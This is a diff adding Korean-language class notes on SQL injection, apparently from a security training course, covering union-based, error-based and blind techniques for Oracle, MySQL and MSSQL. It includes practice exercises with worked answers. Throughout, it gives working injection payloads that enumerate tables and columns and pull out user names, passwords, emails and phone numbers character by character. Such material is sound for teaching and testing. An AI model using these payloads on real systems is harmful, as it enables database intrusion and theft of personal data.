@@ -1,0 +1,320 @@
+1. Union SQL Injection -> 여러 row, 여러 column
+ 1) 쿼리를 유추
+ 2) 공격 포인트      
+ -) 현재 쿼리의 컬럼의 개수
+    order by __숫자__(컬럼의 번호) 
+ -) 현재 쿼리의 자료형 -> 자료형을 따로 구분하지 않고 되는 DB
+    union select null, null, .... 
+                   1, 'a'
+ 3) 테이블 명
+    * oracle 
+    select table_name from user_tables
+    select table_name from all_tables where owner = user
+    * mysql
+    select table_name from information_schema.tables
+    select table_name from information_schema.tables where table_schema = database()
+ 4) 컬럼 명
+    * oracle
+    select column_name from all_tab_columns(user_tab_columns) where table_name = '위에서 탈취한 테이블명'
+    * mysql
+    select column_name from information_schema.columns where table_name = '위에서 탈취한 테이블명'
+ 5) 데이터 탈취
+    select 탈취컬럼 from 탈취테이블
+
+2. Error-based SQL Injection -> 1 row, 1 column
+ 1) 공격포인트 : 에러를 유발을 시켜서 에러메시지가 응답(response)에 노출 될 때
+ 2) 쿼리 유추
+ 3) 테이블 명
+    select table_name from user_tables
+   3-1) 테이블의 개수
+      select count(table_name) from user_tables
+   3-2) 테이블 1 row -> Burpsuite Intruder
+      select table_name from (select table_name, rownum ln from user_tables) where ln = 1 ~ count
+      select table_name from information_schema.tables where table_schema = database() limit 0~count-1, 1
+ 4) 컬럼 명
+    select column_name from all_tab_columns where table_name = '탈취테이블'
+    4-1) 컬럼의 개수
+    select count(column_name) from all_tab_columns where table_name = '탈취테이블'
+    4-2) 컬럼 1 row
+    select column_name from ( select column_name, rownum ln from all_tab_columns where table_name = '탈취테이블') where ln = 1~count
+ 5) 데이터 탈취
+    select 탈취컬럼 from 탈취테이블
+    5-1) 데이터 개수
+     select count(탈취컬럼) from 탈취 테이블
+    5-2) 데이터 1 row 탈취
+     select 탈취컬럼 from (select 탈취컬럼, rownum ln from 탈취 테이블) where ln = 1 ~ count
+
+3. Blind SQL Injection
+ -> Union, 에러 안나옴, 내가 입력한 입력값이 뭔가 쿼리에서 실행이 되는거 같을 때
+
+select * from friends where name like '%멍사%' and '2%'='1%';
+
+// 검색어 : 멍사%' and '1%'='1%  데이터 O -> 참
+// 검색어 : 멍사%' and '1%'='2%  데이터 X -> 거짓
+
+//select * from friends where name like '%멍사%' and (공격쿼리) and '1%'='1%'
+
+//멍사%' and (공격쿼리) and '1%'='1
+
+//count => row 의 개수 
+//length => 문자열의 길이 -> len(문자데이터)
+//substr => 문자열을 쪼개는 함수 -> substr(문자, __시작점__, __몇글자__)
+//ascii => 문자를 ascii 숫자
+
+select length(user) from dual;
+select substr(user,4,1) from dual;                               
+select ascii(substr(user,4,1)) from dual;                               
+select * from friends where name like '%멍사%' and (select length(user) from dual)=4 and '1%'='1%';
+select * from friends where name like '%멍사%' and (substr(user,1,1))='T' and '1%'='1%'
+
+
+Python
+chr(아스키코드) -> 문자
+ord(문자) -> 아스키코드 숫자
+
+select 컬럼.... from 게시판
+where 제목 like '%puppy%' and '1%'='1%'
+
+검색어 
+참 : puppy%' and '1%'='1 
+거짓 : puppy%' and '1%'='2
+
+puppy%' and (공격쿼리) and '1%'='1 
+
+유저명 
+select user from dual
+
+1) 유저명의 길이 : 4글자
+(select length(user) from dual) > 0
+
+puppy%' and ((select length(user) from dual) > 2) and '1%'='1
+
+puppy%’ and ((select length(user) from dual) > 2) and ‘1%’=’1
+
+2) 유저명을 한 글자씩
+ select user from dual
+ (select ascii(substr(user,1,1)) from dual) > 80
+
+
+
+
+* 문제 4번 PHP -> 푸신분들 ASP 4번 -> 할거 없어서 진짜 심심한 사람만 쇼핑몰 문제 1번
+
+user명에 IP가 포함이 되기 때문에
+글자수가 길게 나올겁니다.
+뒤에까지 하지마시고 @ <- 나올 때 까지만해서
+구하시면 됩니다.
+
+1. 공격에 사용한 쿼리문
+2. 정답
+DM으로 보내주시면 됩니다.
+
+user -> user() 
+length() -> len()
+substr() -> substring()
+ascii()  -> asc()
+
+https://sqltest.net
+괄호 위치!!  No 나오시는 분들 확인하세요.
+aa%' and (select len(user_name())) > 0 and '1%'='1 (O)
+aa%' and (select len(user_name()) > 0) and '1%'='1 (X)
+
+
+MySQL 
+유저명 select user()
+문자열길이 length
+문자열 자르기 substring
+아스키 ascii
+
+select 컬럼..... from 게시판
+where 제목 like '%CCC%' and '1%'='1 %'
+
+공격구문 : CCC%' and (공격쿼리) and '1%'='1
+
+1. 유저명의 길이 : 19글자
+select length(user()) > 0
+CCC%' and (select length(user()) > 0) and '1%'='1
+
+2. 유저명을 한 글자씩
+select ascii(substring(user(),1,1)) > 0
+
+CCC%' and (select ascii(substring(user(),1,1)) > 0) and '1%'='1
+
+1: 105
+2: 110
+3: 102
+4: 111
+5: 115
+6: 64
+
+유저명 : infos
+
+유저명 select user_name()
+길이 len()
+자르기 substring()
+아스키 ascii()
+
+CCC%' and ((select len(user_name())) > 0) and '1%'='1
+
+(select len(user_name())) > 0
+
+1. 유저명의 길이 : 4글자
+
+(select ascii(substring(user_name(),1,1))) > 0
+
+CCC%' and ((select ascii(substring(user_name(),1,1))) > 0) and '1%'='1
+
+111
+115
+101
+99
+
+유저명 : osec
+
+select 컬럼들 from 게시판 
+where 제목 like '%puppy%' and '1%'='1%'
+
+검색어 : puppy%' and (공격쿼리) and '1%'='1
+
+1. 테이블
+select table_name from user_tables
+1-1) 테이블의 개수 : 6개 
+  (select count(table_name) from user_tables) >2
+puppy%' and ((select count(table_name) from user_tables) > 0) and '1%'='1
+1-2) 테이블 1 row
+select table_name from (select table_name, rownum ln from user_tables) where ln = 1 ~ 6
+1-2-1) 테이블 명의 문자열 길이
+   (select length(table_name) from (select table_name, rownum ln from user_tables) where ln = 1) > 0
+
+   puppy%' and ((select length(table_name) from (select table_name, rownum ln from user_tables) where ln = 1) > 0) and '1%'='1
+   1번째 테이블의 문자열의 길이 : 5글자
+1-2-2) 테이블 명의 문자열을 1글자씩
+
+    (select ascii(substr(table_name,1,1)) from (select table_name, rownum ln from user_tables) where ln = 1) > 0
+
+   puppy%' and ((select ascii(substr(table_name,1,1)) from (select table_name, rownum ln from user_tables) where ln = 1) > 0) and '1%'='1
+    
+    1번째 테이블의 1번째 글자 : 66 -> B
+    1번째 테이블의 2번째 글자 : 79 -> O
+    1번째 테이블의 3번째 글자 :    -> A v
+    1번째 테이블의 4번째 글자 :    -> R v
+    1번째 테이블의 5번째 글자 :    -> D v
+
+    (select substr(table_name,3,1) from (select table_name, rownum ln from user_tables) where ln = 1) = 'A'
+
+    puppy%' and ((select substr(table_name,3,1) from (select table_name, rownum ln from user_tables) where ln = 1) = 'A') and '1%'='1
+
+
+    (select ascii(substr(table_name,탈취한문자열의길이,1)) from (select table_name, rownum ln from user_tables) where ln = 탈취한테이블의 개수) > 0
+
+2. 컬럼
+1) 컬럼의 개수 : ?개
+ select column_name from all_tab_columns where table_name = 'BOARD'
+ select count(column_name) from all_tab_columns where table_name = 'BOARD'
+2) 컬럼 1 row씩
+    select column_name from (select column_name, rownum ln from all_tab_columns where table_name = 'BOARD')
+    where ln = 1 ~ 위에서구한 count
+  2-1) 컬럼 1row 문자열 길이 -> 1번째 테이블의 1번째 컬럼의 길이
+     select length(column_name) from (select column_name, rownum ln from all_tab_columns where table_name = 'BOARD') where ln = 1 ~ 위에서구한 count > 0
+  2-2) 컬럼 1row 문자열 자르기 -> 1~tablecount번째 테이블의 1~columncount번째 컬럼의 1~length번째 글자
+        (select ascii(substr(column_name,1~위에서구한length,1)) from (select column_name, rownum ln from all_tab_column where table_name = 'BOARD') where ln = 1~count) > 0
+        puppy%' and ( (select ascii(substr(column_name,1,1)) from (select column_name, rownum ln from all_tab_column where table_name = 'BOARD') where ln = 1) > 0) and '1%'='1
+3. 데이터를 탈취
+ 데이터의 개수 : count(*) ->
+  1) 위에서 목표 테이블 member
+  2) 원하는 컬럼 1 row씩 
+    name, id, id, email, phone, ...
+    name, id, id, email, phone, ...
+    select pw from (selct pw, rownum ln from member) where ln =1~count(*)
+    2-1) 문자열 길이
+    (select length(pw) from (selct pw, rownum ln from member) where ln =1~count(*)) > 0
+    (select length(id) from (selct id, rownum ln from member) where ln =1~count(*)) > 0
+    (select length(email) from (selct email, rownum ln from member) where ln =1~count(*)) > 0
+    (select length(phone) from (selct phone, rownum ln from member) where ln =1~count(*)) > 0
+
+    2-2) 문자열 1개씩 잘라서
+    (select ascii(substr(pw,1~pwlength,1)) from (selct pw, rownum ln from member) where ln =1~count(*)) > 0
+     (select ascii(substr(id,1~idlength,1)) from (selct id, rownum ln from member) where ln =1~count(*)) > 0
+     (select ascii(substr(email,1~emaillength,1)) from (selct email, rownum ln from member) where ln =1~count(*)) > 0
+
+     PoC
+
+
+     puppy%' and ((select ascii(substr(email,1~emaillength,1)) from (selct email, rownum ln from member) where ln =1~count(*)) > 0) and '1%'='1
+
+
+
+
+* 문제 6번 PHP(MySQL) 
+데이터 탈취
+
+1. 공격에 사용한 구문
+2. 정답
+
+DM으로 보내주세요.
+
+http://useworld.ddns.net
+
+
+
+* 쇼핑몰 1번 
+상단에 문제1번이 표시되는 페이지에서만 공격이 가능합니다!!!
+
+DB : Oracle
+
+Hint : 너무 하나에 집착하지 마세요.
+       공격 포인트, 쿼리문 유추
+
+
+* php 문제 6번
+select 컬럼들 from 게시판
+where 제목 like '%CC%' and '1%'='1%'
+
+검색어 : CC%' and (공격쿼리) and '1%'='1
+
+
+1) 테이블명 : answer
+2) 컬럼명
+ 2-1) 컬럼의 개수 : 1
+ 2-2) 컬럼 : answer
+  select column_name from information_schema.columns where table_name = 'answer'
+   2-2-1) 컬럼의 문자열 길이 : 6글자
+(select length(column_name) from information_schema.columns where table_name = 'answer') > 0
+
+CC%' and ((select length(column_name) from information_schema.columns where table_name = 'answer') = 6) and '1%'='1
+
+   2-2-2) 컬럼을 한 글자씩
+
+(select ascii(substring(column_name,1,1)) from information_schema.columns where table_name = 'answer') > 0
+
+CC%' and ((select ascii(substring(column_name,1,1)) from information_schema.columns where table_name = 'answer') > 0) and '1%'='1
+
+97
+110
+115
+
+answer
+
+
+3) 데이터 탈취
+3-1) 데이터 길이 : 4글자 
+(select count(answer) from answer) > 0
+(select length(answer) from answer) > 0
+
+
+CC%' and ((select count(answer) from answer) > 0) and '1%'='1
+
+CC%' and ((select length(answer) from answer) > 0) and '1%'='1
+
+3-2) 한글자씩
+(select ascii(substring(answer,1,1)) from answer) > 0
+
+CC%' and ((select ascii(substring(answer,1,1)) from answer) > 0) and '1%'='1
+
+97 a
+98 b 
+99 c 
+100 d
+
+
+abcd
